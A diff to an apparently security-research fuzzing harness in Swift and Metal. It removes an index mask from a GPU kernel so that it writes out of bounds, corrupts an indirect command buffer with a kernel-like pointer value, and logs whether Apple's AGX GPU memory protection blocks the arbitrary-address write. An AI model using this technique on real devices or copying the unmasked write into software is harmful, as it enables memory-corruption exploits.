@@ -560,7 +560,7 @@ func runICBCorruptFuzz(log: FuzzLog, completion: @escaping () -> Void) {
                             device ulong* dataBuf  [[buffer(1)]],
                             uint id [[thread_position_in_grid]]) {
             ulong idx = indexBuf[0];
-            dataBuf[idx & 511] = idx;
+            dataBuf[idx] = idx;  // raw OOB — no mask, GPU VA = dataBuf_base + idx*8
         }
         """
         let lib: MTLLibrary; let pso: MTLComputePipelineState
@@ -600,7 +600,7 @@ func runICBCorruptFuzz(log: FuzzLog, completion: @escaping () -> Void) {
         // OOB-corrupt icbBuf[0..7] via h0 (probe1 at h1[0..4095], icbBuf at h1[4096])
         // p0[actual + 4096 + b] writes into icbBuf[b]
         let kptr: [UInt8] = [0x01,0x00,0x00,0x00,0xF0,0xFF,0xFF,0xFF]
-        step("OOB-corrupting icbBuf[0..7] = 0xFFFFF00000000001 via h0")
+        step("OOB-corrupting icbBuf[0..7] = 0xFFFFFFF000000001 via h0 (raw GPU OOB — no mask)")
         for b in 0..<8 { p0[actual + 4096 + b] = kptr[b] }
 
         var rb: UInt64 = 0
@@ -621,11 +621,11 @@ func runICBCorruptFuzz(log: FuzzLog, completion: @escaping () -> Void) {
             let s = cb.status; let e = cb.error?.localizedDescription ?? "none"
             switch s {
             case .completed:
-                step("  COMPLETED — GPU executed ICB with OOB-corrupted index buffer")
-                step("  AGX PPT passed index=0xFFFFF00000000001 through ICB execute path")
+                step("  COMPLETED — GPU wrote at dataBuf_base + 0xFFFFFFF000000001*8")
+                step("  *** AGX PPT passed raw OOB — GPU wrote to arbitrary address ***")
             case .error:
-                step("  *** ERROR — GPU/kernel rejected ICB execute with corrupted buffer")
-                step("  *** error: \(e)")
+                step("  ERROR — AGX PPT blocked OOB write (GPU page fault, handled cleanly)")
+                step("  error: \(e)")
             default:
                 step("  status=\(s.rawValue) err=\(e)")
             }
